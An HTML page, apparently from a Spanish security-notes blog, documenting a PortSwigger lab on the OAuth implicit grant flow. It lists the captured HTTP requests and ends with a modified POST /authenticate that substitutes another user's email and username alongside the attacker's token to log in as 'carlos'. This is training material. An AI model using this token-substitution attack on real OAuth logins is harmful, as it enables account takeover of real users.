@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;&lt;strong&gt;Implicit Grant Type&lt;/strong&gt; (response_type=token) :&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p><strong>Implicit Grant Type</strong> (response_type=token) :</p>
+
+<pre><code class="language-HTTP">GET /auth?client_id=ad8hfc7kpli96shlhi17k&amp;redirect_uri=https://0a57004c03019f8180790d2c00cc0028.web-security-academy.net/oauth-callback&amp;response_type=token&amp;nonce=1699848058&amp;scope=openid%20profile%20email
+</code></pre>
+
+<pre><code class="language-HTTP">POST /interaction/f7BCf2LSAmq6eUnLqZS3u/login
+
+username=wiener&amp;password=peter
+</code></pre>
+
+<pre><code class="language-HTTP">GET /auth/f7BCf2LSAmq6eUnLqZS3u
+</code></pre>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Redirecting to &lt;a href="https://0a57004c03019f8180790d2c00cc0028.web-security-academy.net/oauth-callback#access_token=cC_H_dhSDbAu56Hp7eCZyzjMPvUia_d_qmfLff8LUop&amp;amp;expires_in=3600&amp;amp;token_type=Bearer&amp;amp;scope=openid%20profile%20email"&gt;https://0a57004c03019f8180790d2c00cc0028.web-security-academy.net/oauth-callback#access_token=cC_H_dhSDbAu56Hp7eCZyzjMPvUia_d_qmfLff8LUop&amp;amp;expires_in=3600&amp;amp;token_type=Bearer&amp;amp;scope=openid%20profile%20email&lt;/a&gt;
+</code></pre></div></div>
+
+<pre><code class="language-HTTP">GET /oauth-callback
+</code></pre>
+
+<pre><code class="language-HTTP">GET /me
+Authorization: Bearer k53eJUaN5aBcMICb4wCXZJcOKNsAFJUIvVXFu55BdoY
+</code></pre>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+	</span><span class="nl">"sub"</span><span class="p">:</span><span class="s2">"wiener"</span><span class="p">,</span><span class="w">
+	</span><span class="nl">"name"</span><span class="p">:</span><span class="s2">"Peter Wiener"</span><span class="p">,</span><span class="w">
+	</span><span class="nl">"email"</span><span class="p">:</span><span class="s2">"wiener@hotdog.com"</span><span class="p">,</span><span class="w">
+	</span><span class="nl">"email_verified"</span><span class="p">:</span><span class="kc">true</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Al final de todo el recorrido se hace una petición extraña , simplemente la modificamos para resolver el lab:</p>
+
+<pre><code class="language-HTTP">POST /authenticate HTTP/2
+
+{
+	"email":"carlos@carlos-montoya.net",
+	"username":"carlos",
+	"token":"k53eJUaN5aBcMICb4wCXZJcOKNsAFJUIvVXFu55BdoY"
+}
+</code></pre>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
